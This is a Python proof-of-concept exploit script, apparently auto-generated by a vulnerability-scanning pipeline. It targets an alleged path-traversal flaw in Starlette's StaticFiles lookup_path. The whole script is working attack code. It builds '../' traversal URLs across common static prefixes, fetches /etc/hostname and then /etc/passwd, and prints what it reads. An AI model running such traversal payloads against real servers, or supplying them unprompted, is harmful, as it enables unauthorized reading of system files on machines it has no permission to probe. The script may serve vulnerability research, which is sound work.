#!/usr/bin/env python3
# PoC for starlette (/home/xcy/.local/lib/python3.14/site-packages/starlette)
# Path: suspicious-015
# Sink: lookup_path
# Auto-generated — run with: python3 lfi_lookup_function_staticfiles_lookup_path_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Starlette StaticFiles Path Traversal (LFI)
Vulnerability: lookup_path() in staticfiles.py does not sanitize '../' sequences.
Impact: An attacker can read arbitrary files outside the intended static directories.
"""

import requests
import sys
import os

# ===== CONFIGURATION =====
TARGET_URL = "http://localhost:8000"  # Change this to the target server
# =========================

def exploit_lfi(target_url: str, file_to_read: str = "/etc/passwd") -> str:
    """
    Attempt to read a file via path traversal in Starlette's StaticFiles.
    
    The vulnerability exists because lookup_path() only checks for absolute paths
    (starting with '/' or '\\') but does not sanitize '../' sequences.
    os.path.join() normalizes the path, allowing directory traversal.
    
    Args:
        target_url: Base URL of the vulnerable Starlette application
        file_to_read: Absolute path of the file to read (default: /etc/passwd)
    
    Returns:
        The content of the file if successful, or an error message string.
    """
    # Construct the traversal payload
    # We need to go up from the static directory to root, then read the target file
    # The number of '../' depends on the depth of the static directory.
    # We'll try a common pattern: ../../../../../
    traversal = "../../../../../../"
    payload = f"{traversal}{file_to_read.lstrip('/')}"
    
    # The static files endpoint is typically /static/ or /files/
    # We'll try common prefixes
    endpoints = ["/static/", "/files/", "/static", "/files", ""]
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}{payload}"
        print(f"[*] Trying: {url}")
        
        try:
            response = requests.get(url, timeout=10, allow_redirects=False)
            
            # Check if we got a successful response with content
            if response.status_code == 200 and len(response.text) > 0:
                # Verify it's not an HTML error page
                if not response.text.startswith("<!DOCTYPE") and not response.text.startswith("<html"):
                    print(f"[+] SUCCESS! Read file: {file_to_read}")
                    print(f"[+] Response length: {len(response.text)} bytes")
                    return response.text
                else:
                    print(f"[-] Got HTML response, likely not the file content")
            elif response.status_code == 404:
                print(f"[-] 404 Not Found - endpoint may not exist")
            elif response.status_code == 403:
                print(f"[-] 403 Forbidden - access denied")
            else:
                print(f"[-] Status code: {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error - is the server running at {target_url}?")
            return "Connection failed"
        except requests.exceptions.Timeout:
            print(f"[-] Timeout - server not responding")
            return "Timeout"
        except Exception as e:
            print(f"[-] Error: {e}")
            continue
    
    return "Failed to exploit - no vulnerable endpoint found"

def main():
    """Main function to run the exploit."""
    print("=" * 60)
    print("Starlette StaticFiles Path Traversal PoC")
    print("=" * 60)
    print(f"[*] Target: {TARGET_URL}")
    print()
    
    # Try to read a harmless file first (safe by default)
    print("[*] Attempting to read /etc/hostname (safe file)...")
    result = exploit_lfi(TARGET_URL, "/etc/hostname")
    if result and not result.startswith("Failed") and not result.startswith("Connection") and not result.startswith("Timeout"):
        print(f"\n[+] File content:\n{result}")
        print("\n[*] Vulnerability confirmed! Now trying /etc/passwd...")
        result2 = exploit_lfi(TARGET_URL, "/etc/passwd")
        if result2 and not result2.startswith("Failed"):
            print(f"\n[+] /etc/passwd content:\n{result2}")
    else:
        print(f"\n[-] {result}")
        print("\n[*] Note: If the server uses a different static URL prefix,")
        print("    modify the 'endpoints' list in the exploit_lfi() function.")
        print("    Common prefixes: /static/, /files/, /media/, /public/")

if __name__ == "__main__":
    main()
